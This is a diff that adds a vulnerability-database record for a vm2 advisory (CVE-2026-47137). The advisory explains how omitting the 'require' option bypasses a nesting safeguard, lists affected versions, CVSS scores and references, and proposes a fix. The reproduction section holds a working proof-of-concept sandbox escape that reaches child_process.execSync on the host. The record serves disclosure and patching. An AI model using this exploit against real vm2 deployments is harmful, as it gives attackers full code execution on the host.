@@ -1,0 +1,206 @@
+advisory_id: GHSA-m4wx-m65x-ghrr
+datasource_id: github_osv/GHSA-m4wx-m65x-ghrr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-m4wx-m65x-ghrr/GHSA-m4wx-m65x-ghrr.json
+aliases:
+  - CVE-2026-47137
+summary: |
+  vm2 has a CVE-2023-37903 patch bypass: nesting:true without explicit require still allows full RCE
+  ## Summary
+
+  The fix for GHSA-8hg8-63c5-gwmx (CVE-2023-37903) introduced a check in `nodevm.js` line 263 that blocks the combination `nesting: true` + `require: false`. However, the check uses strict equality (`options.require === false`), which is trivially bypassed by omitting the `require` option entirely.
+
+  When `require` is not specified, `options.require` is `undefined`, not `false`. The strict equality check fails, so the security guard is skipped. Immediately after (line 280), the destructuring default `require: requireOpts = false` assigns `requireOpts = false`, producing the exact configuration the patch was designed to prevent.
+
+  ## Root Cause
+
+  ```javascript
+  // nodevm.js:263 — the security check
+  if (options.nesting === true && options.require === false) {
+      throw new VMError('...');
+  }
+  // nodevm.js:280 — the default assignment (AFTER the check)
+  const { require: requireOpts = false } = options;
+  // When options.require is undefined:
+  //   - Line 263: undefined === false → FALSE → check skipped
+  //   - Line 280: requireOpts = false → same as require:false
+  ```
+
+  ## Impact
+
+  Full Remote Code Execution on the host system. An attacker running code inside a `NodeVM({ nesting: true })` sandbox (without specifying `require`) can:
+
+  1. `require('vm2')` to get the vm2 library
+  2. Construct an inner `NodeVM` with `require: { builtin: ['child_process'] }`
+  3. Execute arbitrary OS commands via `child_process.execSync`
+
+  The inner VM is completely unconstrained by the outer sandbox configuration.
+
+  ## Reproduction
+
+  ```javascript
+  const { NodeVM } = require('vm2');
+
+  // nesting:true, require not specified (defaults to false AFTER the check)
+  const nvm = new NodeVM({ nesting: true });
+
+  const result = nvm.run(`
+    const { NodeVM } = require('vm2');
+    const inner = new NodeVM({
+      require: { builtin: ['child_process'] }
+    });
+    module.exports = inner.run(
+      "module.exports = require('child_process').execSync('id').toString()",
+      'exploit.js'
+    );
+  `, 'exploit.js');
+
+  console.log(result); // prints host uid/gid — full RCE
+  ```
+
+  ## Suggested Fix
+
+  ```javascript
+  // Change the check to catch both false and undefined/omitted:
+  if (options.nesting === true && !options.require) {
+      throw new VMError('...');
+  }
+  ```
+
+  Or move the check after the destructuring default assignment:
+
+  ```javascript
+  const { require: requireOpts = false } = options;
+  if (options.nesting === true && !requireOpts) {
+      throw new VMError('...');
+  }
+  ```
+impacted_packages:
+  - purl: pkg:npm/vm2
+    affected_versions: vers:npm/<=3.11.3
+    fixed_versions: vers:npm/3.11.4
+    affected_packages:
+      - pkg:npm/vm2@0.1.0
+      - pkg:npm/vm2@0.1.1
+      - pkg:npm/vm2@0.2.0
+      - pkg:npm/vm2@0.2.1
+      - pkg:npm/vm2@0.2.2
+      - pkg:npm/vm2@0.2.3
+      - pkg:npm/vm2@0.2.4
+      - pkg:npm/vm2@1.0.0
+      - pkg:npm/vm2@1.0.1
+      - pkg:npm/vm2@2.0.0
+      - pkg:npm/vm2@2.0.2
+      - pkg:npm/vm2@3.0.0
+      - pkg:npm/vm2@3.0.1
+      - pkg:npm/vm2@3.1.0
+      - pkg:npm/vm2@3.2.0
+      - pkg:npm/vm2@3.3.0
+      - pkg:npm/vm2@3.3.1
+      - pkg:npm/vm2@3.4.0
+      - pkg:npm/vm2@3.4.1
+      - pkg:npm/vm2@3.4.2
+      - pkg:npm/vm2@3.4.3
+      - pkg:npm/vm2@3.4.4
+      - pkg:npm/vm2@3.4.5
+      - pkg:npm/vm2@3.4.6
+      - pkg:npm/vm2@3.5.0
+      - pkg:npm/vm2@3.5.1
+      - pkg:npm/vm2@3.5.2
+      - pkg:npm/vm2@3.6.0
+      - pkg:npm/vm2@3.6.1
+      - pkg:npm/vm2@3.6.2
+      - pkg:npm/vm2@3.6.3
+      - pkg:npm/vm2@3.6.4
+      - pkg:npm/vm2@3.6.5
+      - pkg:npm/vm2@3.6.6
+      - pkg:npm/vm2@3.6.7
+      - pkg:npm/vm2@3.6.8
+      - pkg:npm/vm2@3.6.9
+      - pkg:npm/vm2@3.6.10
+      - pkg:npm/vm2@3.6.11
+      - pkg:npm/vm2@3.7.0
+      - pkg:npm/vm2@3.8.0
+      - pkg:npm/vm2@3.8.1
+      - pkg:npm/vm2@3.8.2
+      - pkg:npm/vm2@3.8.3
+      - pkg:npm/vm2@3.8.4
+      - pkg:npm/vm2@3.9.0
+      - pkg:npm/vm2@3.9.1
+      - pkg:npm/vm2@3.9.2
+      - pkg:npm/vm2@3.9.3
+      - pkg:npm/vm2@3.9.4
+      - pkg:npm/vm2@3.9.5
+      - pkg:npm/vm2@3.9.6
+      - pkg:npm/vm2@3.9.7
+      - pkg:npm/vm2@3.9.8
+      - pkg:npm/vm2@3.9.9
+      - pkg:npm/vm2@3.9.10
+      - pkg:npm/vm2@3.9.11
+      - pkg:npm/vm2@3.9.12
+      - pkg:npm/vm2@3.9.13
+      - pkg:npm/vm2@3.9.14
+      - pkg:npm/vm2@3.9.15
+      - pkg:npm/vm2@3.9.16
+      - pkg:npm/vm2@3.9.17
+      - pkg:npm/vm2@3.9.18
+      - pkg:npm/vm2@3.9.19
+      - pkg:npm/vm2@3.10.0
+      - pkg:npm/vm2@3.10.1
+      - pkg:npm/vm2@3.10.2
+      - pkg:npm/vm2@3.10.3
+      - pkg:npm/vm2@3.10.4
+      - pkg:npm/vm2@3.10.5
+      - pkg:npm/vm2@3.11.0
+      - pkg:npm/vm2@3.11.1
+      - pkg:npm/vm2@3.11.2
+      - pkg:npm/vm2@3.11.3
+    fixed_packages:
+      - pkg:npm/vm2@3.11.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/patriksimek/vm2
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/patriksimek/vm2
+        commit: 86ab819f202c3a8dad88cef5705f2e416c5188d7
+        patch_text:
+      - vcs_url: https://github.com/patriksimek/vm2
+        commit: 01a7552add345d5a6862623884e6b79a85bf0568
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '10.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-m4wx-m65x-ghrr/GHSA-m4wx-m65x-ghrr.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-913
+references:
+  - url: https://github.com/patriksimek/vm2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/commit/01a7552add345d5a6862623884e6b79a85bf0568
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/commit/86ab819f202c3a8dad88cef5705f2e416c5188d7
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/releases/tag/v3.11.4
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/security/advisories/GHSA-m4wx-m65x-ghrr
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-47137
+    reference_type:
+    reference_id:
+exploits: []
